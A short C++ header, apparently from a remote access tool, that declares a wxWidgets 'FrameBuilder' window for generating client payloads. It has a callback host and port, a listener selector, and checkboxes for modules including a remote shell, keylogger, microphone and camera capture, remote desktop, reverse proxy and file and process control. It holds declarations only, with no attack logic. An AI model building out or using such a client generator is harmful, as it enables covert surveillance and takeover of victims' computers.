#ifndef __FRAME_BUILDER
#define __FRAME_BUILDER

#include "server.hpp"
#include "headers.hpp"

namespace EnumBuilderIDS {
	enum Enum {
		BTN_Generar = 10,
		BTN_RefListeners,
		CMB_Listeners
	};
}

class FrameBuilder : public wxFrame {
public:
	FrameBuilder(wxWindow*);
private:
	std::string strClave = "";

	wxTextCtrl* txtHost = nullptr;
	wxTextCtrl* txtPort = nullptr;

	wxCheckBox* chkShell = nullptr;
	wxCheckBox* chkKeylogger = nullptr;
	wxCheckBox* chkMic = nullptr;
	wxCheckBox* chkCam = nullptr;
	wxCheckBox* chkRemoteDesk = nullptr;
	wxCheckBox* chkReverseProxy = nullptr;
	wxCheckBox* chkNetScan = nullptr;
	wxCheckBox* chkAdmArchivos = nullptr;
	wxCheckBox* chkAdmProcesos = nullptr;
	wxCheckBox* chkAdmVentanas = nullptr;
	wxCheckBox* chkInformacion = nullptr;
	wxCheckBox* chkBromas = nullptr;

	//Listeners
	wxComboBox* cmbListeners = nullptr;
	std::vector<Listener_List_Data> vc_listeners;
	wxButton* btnRefListeners = nullptr;

	wxButton* btnGenerar = nullptr;

	void OnGenerarCliente(wxCommandEvent& event);
	void OnRefListeners(wxCommandEvent& event);
	void OnCambioListener(wxCommandEvent& event);

	void RefrescarLista();
	
	wxDECLARE_EVENT_TABLE();
};

#endif
